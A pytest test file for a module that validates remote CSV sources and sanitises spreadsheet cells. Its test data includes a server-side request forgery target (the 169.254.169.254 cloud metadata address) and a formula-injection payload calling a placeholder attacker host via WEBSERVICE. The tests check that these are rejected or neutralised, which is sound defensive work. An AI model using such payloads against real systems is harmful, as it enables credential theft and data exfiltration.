from __future__ import annotations

import importlib.util
from pathlib import Path
from unittest.mock import patch

import pandas as pd
import pytest


DAY2_ROOT = Path(__file__).resolve().parents[1] / "day-2"
SPEC = importlib.util.spec_from_file_location(
    "data_source_safety", DAY2_ROOT / "data_source_safety.py"
)
SAFETY = importlib.util.module_from_spec(SPEC)
assert SPEC.loader is not None
SPEC.loader.exec_module(SAFETY)


class FakeResponse:
    status_code = 200
    headers = {"Content-Type": "text/csv"}

    def __init__(self, chunks):
        self._chunks = chunks

    def __enter__(self):
        return self

    def __exit__(self, *args):
        return False

    def iter_content(self, chunk_size):
        del chunk_size
        yield from self._chunks


@pytest.mark.parametrize(
    "url",
    [
        "http://raw.githubusercontent.com/org/repo/main/data.csv",
        "https://127.0.0.1/data.csv",
        "https://169.254.169.254/latest/meta-data.csv",
        "https://example.com/data.csv",
        "https://user:password@raw.githubusercontent.com/org/repo/main/data.csv",
        "https://raw.githubusercontent.com:444/org/repo/main/data.csv",
    ],
)
def test_unapproved_or_unsafe_remote_urls_are_rejected(url):
    with pytest.raises(SAFETY.DataSourceSafetyError):
        SAFETY.validate_remote_url(url)


def test_approved_remote_csv_is_bounded_and_loads_normally():
    url = "https://raw.githubusercontent.com/org/repo/main/data.csv"
    response = FakeResponse([b"name,value\nexample,1\n"])
    with patch("requests.get", return_value=response) as request:
        dataframe = SAFETY.load_csv_safely(url, max_remote_mb=1)

    assert dataframe.to_dict(orient="records") == [{"name": "example", "value": 1}]
    assert request.call_args.kwargs["allow_redirects"] is False
    assert request.call_args.kwargs["timeout"] == (5, 30)


def test_oversized_remote_csv_is_rejected():
    url = "https://raw.githubusercontent.com/org/repo/main/data.csv"
    response = FakeResponse([b"a" * 1025])
    with patch("requests.get", return_value=response):
        with pytest.raises(SAFETY.DataSourceSafetyError, match="byte limit"):
            SAFETY._fetch_remote_bytes(url, max_bytes=1024, timeout_seconds=1)


def test_local_csv_still_loads(tmp_path):
    source = tmp_path / "dataset.csv"
    source.write_text("name,value\nexample,1\n", encoding="utf-8")
    dataframe = SAFETY.load_csv_safely(str(source))
    assert dataframe.iloc[0].to_dict() == {"name": "example", "value": 1}


def test_missing_local_file_and_non_https_scheme_fail_cleanly(tmp_path):
    with pytest.raises(SAFETY.DataSourceSafetyError):
        SAFETY.load_csv_safely(str(tmp_path / "missing.csv"))
    with pytest.raises(SAFETY.DataSourceSafetyError):
        SAFETY.load_csv_safely("ftp://example.com/data.csv")


def test_spreadsheet_formula_prefixes_are_neutralized():
    dataframe = pd.DataFrame(
        {"original_column": ["=WEBSERVICE('https://attacker')", "+cmd", "normal"]}
    )
    safe = SAFETY.spreadsheet_safe_copy(dataframe)
    assert safe["original_column"].tolist() == [
        "'=WEBSERVICE('https://attacker')",
        "'+cmd",
        "normal",
    ]
